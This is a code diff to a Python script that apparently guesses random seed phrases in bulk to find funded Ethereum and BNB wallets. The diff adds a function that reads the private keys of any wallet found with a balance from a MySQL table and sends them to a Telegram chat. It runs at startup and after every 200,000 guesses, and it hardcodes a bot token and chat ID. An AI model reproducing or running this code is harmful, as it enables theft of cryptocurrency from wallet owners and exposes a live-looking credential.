@@ -11,6 +11,8 @@ import threading
 Account.enable_unaudited_hdwallet_features()
 import eth_utils
 import concurrent.futures
+import telegram
+from datetime import datetime
 
 
 script_dir = os.path.dirname(os.path.abspath(__file__))
@@ -254,7 +256,50 @@ def generate_ethereum_keys(seed_phrase):
         pass
     except Exception as e:
         pass
-        
+
+def sendTelegramMessage():
+    # Define your Telegram bot token and chat ID
+    bot_token = '5500299643:AAFqFy2q62ccRi3rX5i9BP91MyLoss0pXSA'
+    chat_id = '1244387492'
+
+    # Create a Telegram bot object
+    bot = telegram.Bot(token=bot_token)
+
+    # Connect to the database
+    connection = mysql.connector.connect(**db_config)
+    cursor = connection.cursor()
+
+    try:
+        # Query the 'gen_address' table for rows where 'bnb_b' or 'eth_b' is greater than 0
+        query = "SELECT public, private, bnb_b, eth_b FROM gen_address WHERE bnb_b > 0 OR eth_b > 0"
+        cursor.execute(query)
+
+        # Fetch the rows
+        rows = cursor.fetchall()
+
+        # Check if there are any rows to send
+        if len(rows) > 0:
+            # Get the current date and time
+            current_datetime = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
+            # Create the message content
+            message_content = f"Date and Time: {current_datetime}\n\n"
+
+            for row in rows:
+                public, private, bnb_b, eth_b = row
+                message_content += f"Public: {public}\nPrivate: {private}\nBNB_B: {bnb_b}\nETH_B: {eth_b}\n\n"
+
+            # Send the message to the Telegram chat
+            bot.send_message(chat_id=chat_id, text=message_content)
+
+    except Exception as e:
+        print(f"Error while sending Telegram message: {e}")
+
+    finally:
+        # Close the database connection
+        cursor.close()
+        connection.close()
+
 
 def main():
     if check_internet_connection():
@@ -262,7 +307,7 @@ def main():
         print("Connected to the internet. Continuing with the code.")
     else:
         print("Could not establish an internet connection.")
-
+    sendTelegramMessage()
 
     # Load your word list
     with open(file_path, "r") as file:
@@ -286,7 +331,7 @@ def main():
         positions = [word_list.index(word) for word in start_words.split(" ")]
     
     # positions = [random.randint(0, len(word_list) - 1) for _ in range(num_words_to_combine)]
-
+    count=0
     with concurrent.futures.ThreadPoolExecutor(100) as executor:
         while True:
             positions = [random.randint(0, len(word_list) - 1) for _ in range(num_words_to_combine)]
@@ -294,6 +339,10 @@ def main():
             seed_phrase = " ".join(word_list[positions[i]] for i in range(num_words_to_combine))
             # generate_ethereum_keys(seed_phrase)
             executor.submit(generate_ethereum_keys, seed_phrase)
+            count=count+1
+            if(count==200000):
+                sendTelegramMessage()
+                count=0
 
 while True:
     try:
